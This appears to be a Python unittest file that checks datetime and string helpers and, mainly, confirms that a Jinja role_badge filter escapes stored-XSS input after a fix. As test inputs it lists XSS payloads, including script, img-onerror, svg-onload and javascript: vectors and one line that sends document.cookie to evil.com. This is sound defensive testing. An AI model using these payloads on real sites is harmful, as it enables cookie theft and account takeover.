"""
Basic tests for utility functions
"""
import unittest
import sys
import os
from datetime import datetime
from unittest.mock import MagicMock

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.datetime_utils import get_utc_now, format_utc_datetime, get_utc_timestamp
from utils.jinja_filters import role_badge


class TestDateTimeUtils(unittest.TestCase):
    """Test datetime utility functions"""
    
    def test_get_utc_now(self):
        """Test get_utc_now returns datetime"""
        result = get_utc_now()
        self.assertIsInstance(result, datetime)
    
    def test_get_utc_timestamp(self):
        """Test get_utc_timestamp returns float"""
        result = get_utc_timestamp()
        self.assertIsInstance(result, float)
        self.assertGreater(result, 0)
    
    def test_format_utc_datetime_default(self):
        """Test format_utc_datetime with default (current time)"""
        result = format_utc_datetime()
        self.assertIsInstance(result, str)
        # ISO format should contain 'T'
        self.assertIn('T', result)
    
    def test_format_utc_datetime_with_value(self):
        """Test format_utc_datetime with specific datetime"""
        dt = datetime(2023, 12, 25, 15, 30, 45)
        result = format_utc_datetime(dt)
        self.assertIsInstance(result, str)
        self.assertIn('2023', result)
        self.assertIn('12', result)
        self.assertIn('25', result)


class TestStringUtils(unittest.TestCase):
    """Test basic string utilities"""
    
    def test_string_truncation_logic(self):
        """Test basic truncation logic"""
        text = "This is a very long text that should be truncated"
        max_length = 20
        
        if len(text) > max_length:
            truncated = text[:max_length] + '...'
        else:
            truncated = text
        
        self.assertEqual(len(truncated), 23)  # 20 + "..."
        self.assertTrue(truncated.endswith('...'))
    
    def test_file_size_calculation(self):
        """Test file size calculation logic"""
        # Test bytes
        size = 500
        self.assertLess(size, 1024)
        
        # Test KB
        size_kb = 1500
        kb_value = size_kb / 1024.0
        self.assertGreater(kb_value, 1.0)
        self.assertLess(kb_value, 1024.0)


class TestRoleBadgeXSSPrevention(unittest.TestCase):
    """Test XSS prevention in role_badge filter.

    The remediation for Stored XSS (CWE-79) consists of two parts:
      1. role_badge() now returns a markupsafe.Markup object (instead of str)
         so Jinja2 auto-escaping treats the wrapper HTML as intentionally safe.
      2. The admin.html template no longer uses the |safe filter on role_badge,
         which removes the auto-escape bypass that made the taint flow exploitable.
    These tests verify both the escaping behaviour and the Markup return type.
    """

    def setUp(self):
        """Set up mock context for Jinja2 contextfilter"""
        self.mock_context = MagicMock()

    # ------------------------------------------------------------------
    # Return-type tests: verify the fix uses Markup, not plain str
    # ------------------------------------------------------------------

    def test_role_badge_returns_markup_object(self):
        """role_badge must return Markup, not str, so |safe is not needed.

        Jinja2 auto-escaping treats Markup as already-safe HTML and will not
        double-encode the wrapper tags.  A plain str return would still require
        |safe in the template, re-exposing the XSS bypass.
        """
        from markupsafe import Markup
        result = role_badge(self.mock_context, 'admin')
        self.assertIsInstance(
            result,
            Markup,
            "role_badge must return markupsafe.Markup so the template can "
            "omit |safe and rely on Jinja2 auto-escaping.",
        )

    def test_role_badge_xss_payload_returns_markup_object(self):
        """Markup return type is preserved even when the input is malicious."""
        from markupsafe import Markup
        result = role_badge(self.mock_context, '<script>alert(1)</script>')
        self.assertIsInstance(result, Markup)

    def test_role_badge_none_returns_markup_object(self):
        """Markup return type is preserved for None input."""
        from markupsafe import Markup
        result = role_badge(self.mock_context, None)
        self.assertIsInstance(result, Markup)

    # ------------------------------------------------------------------
    # Escaping behaviour tests
    # ------------------------------------------------------------------

    def test_role_badge_escapes_script_tag(self):
        """Test that script tags in role are escaped"""
        malicious_role = "<script>alert('XSS')</script>"
        result = role_badge(self.mock_context, malicious_role)

        # Should NOT contain unescaped script tags
        self.assertNotIn("<script>", result)
        self.assertNotIn("</script>", result)

        # Should contain escaped versions
        self.assertIn("&lt;script&gt;", result)
        self.assertIn("&lt;/script&gt;", result)

        # Badge structure should still be present
        self.assertIn('<span class="badge', result)
        self.assertIn('</span>', result)

    def test_role_badge_escapes_img_onerror(self):
        """Test that img onerror XSS vectors are escaped"""
        malicious_role = '<img src=x onerror="alert(1)">'
        result = role_badge(self.mock_context, malicious_role)

        # Should NOT contain unescaped img tag
        self.assertNotIn('<img ', result)
        self.assertNotIn('onerror=', result)

        # Should contain escaped version
        self.assertIn("&lt;img", result)

        # Badge structure should still be present
        self.assertIn('<span class="badge', result)

    def test_role_badge_escapes_event_handlers(self):
        """Test that event handler attributes are escaped"""
        malicious_role = 'admin" onload="alert(document.cookie)'
        result = role_badge(self.mock_context, malicious_role)

        # Should escape quotes and special characters
        self.assertNotIn('onload="alert', result)
        self.assertIn('&#34;', result)  # Escaped quote

        # Badge structure should be safe
        self.assertIn('<span class="badge', result)

    def test_role_badge_with_legitimate_admin_role(self):
        """Test that legitimate admin role works correctly"""
        result = role_badge(self.mock_context, 'admin')

        # Should contain proper HTML structure
        self.assertIn('<span class="badge badge-danger">admin</span>', result)

        # Should not have any escaped characters for clean input
        self.assertNotIn('&lt;', result)
        self.assertNotIn('&gt;', result)

    def test_role_badge_with_legitimate_project_manager_role(self):
        """Test that legitimate project_manager role works correctly"""
        result = role_badge(self.mock_context, 'project_manager')

        # Should contain proper HTML structure
        self.assertIn('<span class="badge badge-primary">project_manager</span>', result)

    def test_role_badge_with_legitimate_team_member_role(self):
        """Test that legitimate team_member role works correctly"""
        result = role_badge(self.mock_context, 'team_member')

        # Should contain proper HTML structure
        self.assertIn('<span class="badge badge-secondary">team_member</span>', result)

    def test_role_badge_with_unknown_role(self):
        """Test that unknown roles default to secondary color"""
        result = role_badge(self.mock_context, 'unknown_role')

        # Should use secondary color for unknown roles
        self.assertIn('badge-secondary', result)
        self.assertIn('unknown_role', result)

    def test_role_badge_escapes_html_entities(self):
        """Test that HTML entities are properly escaped"""
        malicious_role = '&lt;script&gt;alert("XSS")&lt;/script&gt;'
        result = role_badge(self.mock_context, malicious_role)

        # Should double-escape already encoded entities
        self.assertIn('&amp;lt;', result)

        # Badge structure should be present
        self.assertIn('<span class="badge', result)

    def test_role_badge_with_none_value(self):
        """Test that None values are handled safely"""
        result = role_badge(self.mock_context, None)

        # Should return empty string for role content
        self.assertIn('<span class="badge badge-secondary"></span>', result)

    def test_role_badge_with_empty_string(self):
        """Test that empty strings are handled safely"""
        result = role_badge(self.mock_context, '')

        # Should handle empty string gracefully
        self.assertIn('<span class="badge badge-secondary"></span>', result)

    def test_role_badge_prevents_javascript_protocol(self):
        """Test that javascript: protocol is escaped"""
        malicious_role = 'javascript:alert(1)'
        result = role_badge(self.mock_context, malicious_role)

        # Should escape the content
        self.assertIn('javascript:alert(1)', result)

        # But should not be executable (not in a href or src context)
        self.assertIn('<span class="badge', result)

    def test_role_badge_escapes_sql_injection_attempts(self):
        """Test that SQL-like strings are safely rendered"""
        sql_role = "'; DROP TABLE users; --"
        result = role_badge(self.mock_context, sql_role)

        # Should safely include the content (escaped)
        self.assertIn('&#39;', result)  # Escaped single quote
        self.assertIn('<span class="badge', result)

    def test_role_badge_with_multiline_xss(self):
        """Test that multiline XSS attempts are escaped"""
        malicious_role = (
            "<script>\n"
            "        fetch('https://evil.com?cookie=' + document.cookie)\n"
            "        </script>"
        )
        result = role_badge(self.mock_context, malicious_role)

        # Should escape the script tags
        self.assertNotIn('<script>', result)
        self.assertIn('&lt;script&gt;', result)

        # Badge structure should be intact
        self.assertIn('<span class="badge', result)

    def test_role_badge_with_svg_xss(self):
        """Test that SVG-based XSS is escaped"""
        malicious_role = '<svg onload="alert(1)">'
        result = role_badge(self.mock_context, malicious_role)

        # Should escape SVG tag
        self.assertNotIn('<svg', result)
        self.assertIn('&lt;svg', result)

        # Badge structure should be safe
        self.assertIn('<span class="badge', result)

    def test_role_badge_prevents_stored_xss_attack(self):
        """Test comprehensive stored XSS prevention scenario"""
        # Simulate an attacker storing malicious role in database
        attacker_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '\'><script>alert(document.domain)</script>',
        ]

        for payload in attacker_payloads:
            result = role_badge(self.mock_context, payload)

            # None of these should contain executable script tags
            self.assertNotIn('<script', result.lower())
            self.assertNotIn('<img ', result.lower())
            self.assertNotIn('<svg', result.lower())
            self.assertNotIn('<iframe', result.lower())
            self.assertNotIn('onerror=', result.lower())
            self.assertNotIn('onload=', result.lower())
            self.assertNotIn('javascript:', result.lower())

            # Should contain escaped versions
            self.assertIn('&lt;', result)

            # Badge wrapper should always be present
            self.assertIn('<span class="badge', result)
            self.assertIn('</span>', result)

    # ------------------------------------------------------------------
    # Template integration: verify |safe is absent from admin.html
    # ------------------------------------------------------------------

    def test_admin_template_does_not_use_safe_filter_on_role_badge(self):
        """admin.html must not use |safe on role_badge output.

        The Stored XSS was enabled by ``{{ user.role|role_badge|safe }}`` which
        bypasses Jinja2 auto-escaping.  After the fix, role_badge returns a
        Markup object, so the template omits |safe and relies on Jinja2
        auto-escaping.  This test enforces that regression does not occur.
        """
        import os
        template_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'templates', 'admin.html',
        )
        with open(template_path, 'r') as fh:
            content = fh.read()

        # The unsafe pattern must not appear anywhere in the template.
        self.assertNotIn(
            'role_badge|safe',
            content,
            "admin.html must not pipe role_badge output through |safe — "
            "role_badge returns Markup and Jinja2 auto-escaping is sufficient.",
        )


if __name__ == '__main__':
    unittest.main()

